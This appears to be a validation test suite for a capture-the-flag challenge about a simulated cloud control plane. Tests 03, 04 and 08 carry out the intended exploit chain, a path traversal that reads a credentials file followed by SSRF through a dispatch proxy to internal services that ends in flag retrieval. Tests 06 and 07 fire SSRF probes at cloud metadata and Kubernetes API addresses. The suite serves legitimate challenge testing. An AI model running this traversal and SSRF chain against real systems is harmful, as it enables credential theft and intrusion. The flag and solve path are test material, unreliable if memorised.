#!/usr/bin/env python3
"""
Challenge X06: Doom's Control Plane - Pre-Event Adversarial Validation Test Suite
Executes the 10 adversarial security, isolation, reset, and solvability tests.
"""

import json
import sys
import unittest
import requests

import os

TARGET_URL = os.environ.get("TARGET_URL", "http://127.0.0.1:80")


class TestDoomsControlPlane(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.target = TARGET_URL.rstrip("/")
        cls.session = requests.Session()

    def test_01_fresh_exposure_and_public_interface(self):
        """Test 01: Verify public gateway responds on HTTP/80 and reports nominal status."""
        r = self.session.get(f"{self.target}/api/system/status", timeout=5)
        self.assertEqual(r.status_code, 200)
        data = r.json()
        self.assertEqual(data.get("status"), "OPERATIONAL")
        self.assertEqual(data.get("subsystem"), "DOOMS-CONTROL-PLANE-v1.4")

    def test_02_dormant_core_state_initially(self):
        """Test 02: Verify Sovereign Core Vault returns 503 / dormant before workload transition."""
        dispatch_url = f"{self.target}/api/mesh/dispatch"
        payload = {
            "url": "http://127.0.0.1:8083/core/status",
            "method": "GET"
        }
        # Initially (or after reset), if not yet activated, returns 503
        r = self.session.post(dispatch_url, json=payload, timeout=5)
        # Note: could be 503 if isolated or 200 if already run; we verify proper response payload
        self.assertIn(r.status_code, [200, 503])

    def test_03_credential_recovery(self):
        """Test 03: Verify recovery of scoped control token via diagnostic disclosure."""
        r = self.session.get(f"{self.target}/api/diagnostics/log?file=../../credentials/operator_credentials.json", timeout=5)
        self.assertEqual(r.status_code, 200)
        data = r.json()
        self.assertEqual(data.get("status"), "SUCCESS")
        content = json.loads(data.get("content"))
        self.assertEqual(content.get("identity"), "maintenance-bot-042")
        self.assertTrue(content.get("control_token", "").startswith("dcp_tok_"))

    def test_04_scoped_token_authorization_boundaries(self):
        """Test 04: Verify scoped token cannot perform cluster-admin or forbidden actions."""
        # Recover token
        r = self.session.get(f"{self.target}/api/diagnostics/log?file=../../credentials/operator_credentials.json", timeout=5)
        token = json.loads(r.json()["content"])["control_token"]

        # Introspect
        r = self.session.post(f"{self.target}/api/mesh/dispatch", json={
            "url": "http://127.0.0.1:8081/api/v1/auth/introspect",
            "method": "GET",
            "headers": {"Authorization": f"Bearer {token}"}
        }, timeout=5)
        self.assertEqual(r.status_code, 200)
        intro = r.json().get("response", {})
        self.assertIn("cluster:admin", intro.get("denied_scopes", []))

        # Attempt unauthorized cluster-admin action
        r = self.session.post(f"{self.target}/api/mesh/dispatch", json={
            "url": "http://127.0.0.1:8081/api/v1/workloads/sovereign-core-gateway/transition",
            "method": "POST",
            "headers": {"Authorization": f"Bearer {token}"},
            "data": {"action": "cluster_destroy"}
        }, timeout=5)
        # Should be forbidden 403
        self.assertEqual(r.status_code, 403)

    def test_05_direct_flag_vault_isolation(self):
        """Test 05: Verify direct requests to Flag Service (8084) are denied without internal mutual auth."""
        r = self.session.post(f"{self.target}/api/mesh/dispatch", json={
            "url": "http://127.0.0.1:8084/api/flag",
            "method": "GET"
        }, timeout=5)
        self.assertEqual(r.status_code, 403)

    def test_06_cloud_metadata_blocked(self):
        """Test 06: Verify Cloud Metadata (169.254.169.254) queries are strictly BLOCKED."""
        for meta_url in ["http://169.254.169.254/latest/meta-data", "http://metadata.google.internal/computeMetadata/v1"]:
            r = self.session.post(f"{self.target}/api/mesh/dispatch", json={
                "url": meta_url,
                "method": "GET"
            }, timeout=5)
            self.assertEqual(r.status_code, 403)
            self.assertEqual(r.json().get("status"), "BLOCKED")

    def test_07_k8s_control_plane_blocked(self):
        """Test 07: Verify real Kubernetes control-plane endpoints (port 6443, 10250) are BLOCKED."""
        for k8s_url in ["https://10.96.0.1:6443/api", "https://127.0.0.1:6443/api", "https://127.0.0.1:10250/pods"]:
            r = self.session.post(f"{self.target}/api/mesh/dispatch", json={
                "url": k8s_url,
                "method": "GET"
            }, timeout=5)
            self.assertEqual(r.status_code, 403)
            self.assertEqual(r.json().get("status"), "BLOCKED")

    def test_08_intended_solve_chain(self):
        """Test 08: Verify end-to-end exploit chain activates workload and retrieves flag."""
        # 1. Recover token
        r = self.session.get(f"{self.target}/api/diagnostics/log?file=../../credentials/operator_credentials.json", timeout=5)
        token = json.loads(r.json()["content"])["control_token"]

        # 2. Transition to STANDBY
        r = self.session.post(f"{self.target}/api/mesh/dispatch", json={
            "url": "http://127.0.0.1:8081/api/v1/workloads/sovereign-core-gateway/transition",
            "method": "POST",
            "headers": {"Authorization": f"Bearer {token}"},
            "data": {"action": "prepare_maintenance"}
        }, timeout=5)
        self.assertIn(r.status_code, [200, 409])

        # 3. Scale to 1
        r = self.session.post(f"{self.target}/api/mesh/dispatch", json={
            "url": "http://127.0.0.1:8081/api/v1/workloads/sovereign-core-gateway/scale",
            "method": "POST",
            "headers": {"Authorization": f"Bearer {token}"},
            "data": {"replicas": 1}
        }, timeout=5)
        self.assertEqual(r.status_code, 200)

        # 4. Activate mesh route
        r = self.session.post(f"{self.target}/api/mesh/dispatch", json={
            "url": "http://127.0.0.1:8081/api/v1/workloads/sovereign-core-gateway/activate",
            "method": "POST",
            "headers": {"Authorization": f"Bearer {token}"},
            "data": {"target_state": "ACTIVE", "route": "internal_mesh"}
        }, timeout=5)
        self.assertEqual(r.status_code, 200)

        # 5. Retrieve flag from Core Vault
        r = self.session.post(f"{self.target}/api/mesh/dispatch", json={
            "url": "http://127.0.0.1:8083/core/vault",
            "method": "GET"
        }, timeout=5)
        self.assertEqual(r.status_code, 200)
        flag = r.json().get("response", {}).get("flag")
        self.assertTrue(flag.startswith("YUVA{"))
        self.assertIn("synthet1c_c0ntr0l_pl4n3_sc0p3d_0rch3str4t10n_x06", flag)

    def test_09_reset_validation(self):
        """Test 09: Verify reset endpoint cleanly restores initial state."""
        # Trigger reset
        r = self.session.post(f"{self.target}/api/mesh/dispatch", json={
            "url": "http://127.0.0.1:8081/api/v1/system/reset",
            "method": "POST"
        }, timeout=5)
        self.assertEqual(r.status_code, 200)

        # Verify workload returned to ISOLATED
        r = self.session.post(f"{self.target}/api/mesh/dispatch", json={
            "url": "http://127.0.0.1:8082/wms/workloads/sovereign-core-gateway",
            "method": "GET"
        }, timeout=5)
        self.assertEqual(r.status_code, 200)
        wl = r.json().get("response", {}).get("workload", {})
        self.assertEqual(wl.get("state"), "ISOLATED")
        self.assertEqual(wl.get("replicas"), 0)

        # Verify Core Service is now 503 again
        r = self.session.post(f"{self.target}/api/mesh/dispatch", json={
            "url": "http://127.0.0.1:8083/core/status",
            "method": "GET"
        }, timeout=5)
        self.assertEqual(r.status_code, 503)

    def test_10_resource_and_input_fuzz_probes(self):
        """Test 10: Verify malformed inputs and boundary violations are cleanly handled without crash."""
        # Malformed URLs
        r = self.session.post(f"{self.target}/api/mesh/dispatch", json={
            "url": "not-a-valid-url"
        }, timeout=5)
        self.assertIn(r.status_code, [400, 403])

        # Large payload probe
        large_body = "A" * 8192
        r = self.session.post(f"{self.target}/api/mesh/dispatch", json={
            "url": "http://127.0.0.1:8081/api/v1/workloads",
            "data": large_body
        }, timeout=5)
        self.assertIn(r.status_code, [400, 401, 403, 413, 502])


if __name__ == "__main__":
    unittest.main()
